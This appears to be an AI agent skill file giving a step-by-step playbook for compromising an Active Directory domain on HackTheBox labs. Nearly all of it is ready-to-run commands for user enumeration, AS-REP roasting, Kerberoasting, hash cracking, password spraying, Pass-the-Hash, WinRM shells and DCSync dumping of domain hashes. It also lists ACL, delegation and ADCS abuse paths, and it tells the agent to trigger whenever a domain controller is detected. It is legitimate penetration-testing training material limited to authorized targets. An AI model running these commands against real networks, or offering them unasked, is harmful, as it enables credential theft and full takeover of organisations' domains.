---
name: htb-active-directory
description: >
  Attacking an Active Directory domain on an authorized HTB box/lab. Trigger this
  when you detect a Domain Controller (ports 88 Kerberos, 389/636 LDAP, 445 SMB,
  5985 WinRM) or a .htb domain. Covers: enumeration (BloodHound, netexec,
  ldapdomaindump), AS-REP roasting and Kerberoasting (impacket), password
  spraying, ACL and delegation abuse, Pass-the-Hash, secret extraction
  (secretsdump), and access via evil-winrm. Produces an escalation path to
  Domain Admin.
metadata:
  type: reference
  category: active-directory
  legal: "Authorized targets only (HTB, labs, CTF, systems you own)."
---

# HTB — Active Directory

## When to use this skill
A domain controller is present (Kerberos/LDAP/SMB) or a `.htb` domain is known.
Goal: start from weak access (often low-privilege creds or even nothing) and
climb up to Domain Admin.

## Prerequisites
Set the variables and sync the clock (Kerberos is sensitive to it):
```bash
IP=10.10.10.10; DC=dc01.machine.htb; DOMAIN=machine.htb
sudo ntpdate "$IP" 2>/dev/null || sudo rdate -n "$IP" 2>/dev/null
echo "$IP $DC ${DC%%.*} $DOMAIN" | sudo tee -a /etc/hosts
```

## 1) Enumeration
```bash
# Users without creds: brute-force names via Kerberos (no lockout)
kerbrute userenum -d "$DOMAIN" --dc "$IP" /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# With creds: full mapping
netexec ldap "$IP" -u user -p 'pass' --users --groups
ldapdomaindump -u "$DOMAIN\\user" -p 'pass' "$IP" -o ldapdump/

# BloodHound (Python collector)
bloodhound-python -u user -p 'pass' -d "$DOMAIN" -ns "$IP" -c All --zip
#  -> import the .zip into the BloodHound GUI, look for paths to DA
```

## 2) Kerberos attacks (without or with creds)
```bash
# AS-REP roasting: accounts without pre-auth (from a user list)
impacket-GetNPUsers "$DOMAIN"/ -usersfile users.txt -no-pass -dc-ip "$IP" -format hashcat

# Kerberoasting: service accounts (requires valid creds)
impacket-GetUserSPNs "$DOMAIN"/user:'pass' -dc-ip "$IP" -request -outputfile kerb.hash

# Crack (see htb-password-attacks)
hashcat -m 18200 asrep.hash rockyou.txt   # AS-REP
hashcat -m 13100 kerb.hash rockyou.txt    # TGS/Kerberoast
```

## 3) Password spraying (careful with lockout)
```bash
netexec smb "$IP" -u users.txt -p 'Season2024!' --continue-on-success
```

## 4) Lateral movement & access
```bash
# Check where creds/hash work
netexec smb "$IP" -u user -p 'pass'                 # 'Pwn3d!' = local admin
netexec winrm "$IP" -u user -p 'pass'

# Pass-the-Hash
netexec smb "$IP" -u Administrator -H <NTLM_hash>

# Interactive shell
evil-winrm -i "$IP" -u user -p 'pass'
evil-winrm -i "$IP" -u Administrator -H <NTLM_hash>
```

## 5) Dumping secrets (once admin)
```bash
impacket-secretsdump "$DOMAIN"/user:'pass'@"$IP"
netexec smb "$IP" -u Administrator -H <hash> --ntds     # DCSync of the domain hashes
```

## Reflexes / classic paths
- **AS-REP / Kerberoast** → crackable hash → new creds.
- **BloodHound shows `GenericAll`/`WriteDACL`/`ForceChangePassword`** → abuse the ACL (reset password, add to group).
- **`GetChangesAll`** → DCSync → hash of `krbtgt`/Administrator.
- **Unconstrained / constrained delegation** → impersonation.
- **Misconfigured ADCS** → `certipy find` then ESC1-ESC8.
- Always replay found creds on SMB/WinRM/MSSQL/LDAP (reuse).

## Tips
- `KRB_AP_ERR_SKEW` error = clock out of sync → resync.
- Use the FQDN (not the IP) for Kerberos operations.
- Keep a record of every credential in a structured `creds.txt` file.
